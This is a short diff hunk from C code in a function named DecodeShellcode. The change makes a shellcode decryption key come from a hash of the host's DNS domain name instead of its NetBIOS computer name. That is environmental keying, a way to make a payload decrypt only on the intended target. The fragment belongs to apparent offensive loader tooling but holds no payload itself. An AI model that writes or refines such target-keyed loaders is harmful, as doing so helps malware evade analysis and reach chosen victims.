@@ -119,7 +119,7 @@ void DecodeShellcode() {
 	unsigned int hc = 0; // Hash position marker
 
 	// Get the computer name (to be used as a decryption key)
-	if (cn = (char *) GetComputerInfo(ComputerNamePhysicalNetBIOS)) {
+	if (cn = (char *)GetComputerInfo(ComputerNamePhysicalDnsDomain)) {
 		if (cnhash = GenerateHash(cn, strlen(cn))) {
 			
 			// Loop through the shellcode
